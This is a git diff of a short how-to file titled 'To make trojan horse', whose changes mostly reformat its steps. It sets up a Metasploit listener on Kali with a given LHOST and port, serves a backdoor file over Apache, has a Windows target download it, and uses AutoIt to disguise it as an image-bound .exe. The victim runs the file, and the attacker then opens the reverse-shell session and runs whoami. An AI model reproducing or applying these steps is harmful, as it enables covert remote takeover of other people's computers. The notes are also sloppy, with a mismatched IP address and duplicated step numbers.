@@ -1,4 +1,5 @@
-To make trojan horse,
+To make trojan horse
+
 Step 1:
 Go to Kali
 open terminal Sudo user
@@ -14,25 +15,25 @@ run the apache serve
 > set LHOST 192.169.68.101
 > SET LPORT 8080
 > exploit -j -z
-Now on target/windows machine
 
-Step2:
-> Browser> enter Linux's ip i.e 192.168.68.101
+Step 2: Now on target/windows machine
+> Browser enter Linux's ip i.e 192.168.68.101
 > Have an image on machine to trojan the Backdoor file
 > Download the file TrojanHorse.txt
-Step3:
-> Download, AUTOIT: https://www.autoitscript.com/site/autoit/
-> Install
-> Run Autoit Compile script to .exe
+
+Step3: Download, AUTOIT: https://www.autoitscript.com/site/autoit/
+>Install
+>Run Autoit Compile script to .exe
 > Paste the path of TrojanHorse.txt and Trojan image
 > Convert
 
- Step3:
- > Now run the exe file
-Step4:
-> On Linux run command
+Step 3:
+> Now run the exe file
+
+Step 4:
+On Linux run command
 > session -l
->session -1
+> session -1
 > pwd
 > whoami
 
